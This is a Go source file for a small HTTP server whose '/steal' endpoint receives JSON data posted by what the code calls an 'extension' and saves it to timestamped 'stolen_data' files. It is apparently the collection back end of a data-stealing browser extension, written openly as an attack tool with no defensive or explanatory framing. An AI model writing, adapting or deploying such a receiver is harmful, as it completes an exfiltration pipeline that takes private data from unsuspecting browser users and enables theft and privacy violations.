package main

import (
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"time"
)

func stealHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Only POST requests allowed", http.StatusMethodNotAllowed)
		return
	}

	body, err := io.ReadAll(r.Body)
	if err != nil {
		http.Error(w, "Failed to read request body", http.StatusBadRequest)
		return
	}
	defer r.Body.Close()

	fmt.Println("=== Data received from extension ===")
	fmt.Println(string(body))

	// Validate JSON format
	var js map[string]interface{}
	if err := json.Unmarshal(body, &js); err != nil {
		http.Error(w, "Invalid JSON received", http.StatusBadRequest)
		return
	}

	// Create unique JSON file with timestamp
	filename := fmt.Sprintf("stolen_data_%s.json", time.Now().Format("20060102_150405"))
	file, err := os.Create(filename)
	if err != nil {
		log.Printf("Error creating file: %v\n", err)
		http.Error(w, "Could not save data", http.StatusInternalServerError)
		return
	}
	defer file.Close()

	enc := json.NewEncoder(file)
	enc.SetIndent("", "  ")
	if err := enc.Encode(js); err != nil {
		log.Printf("Error writing JSON: %v\n", err)
		http.Error(w, "Failed to write JSON", http.StatusInternalServerError)
		return
	}

	w.WriteHeader(http.StatusOK)
	w.Write([]byte("✅ Data received and saved in JSON format."))
}

func main() {
	http.HandleFunc("/steal", stealHandler)
	fmt.Println("🔴 Listening on http://localhost:8080")
	log.Fatal(http.ListenAndServe(":8080", nil))
}
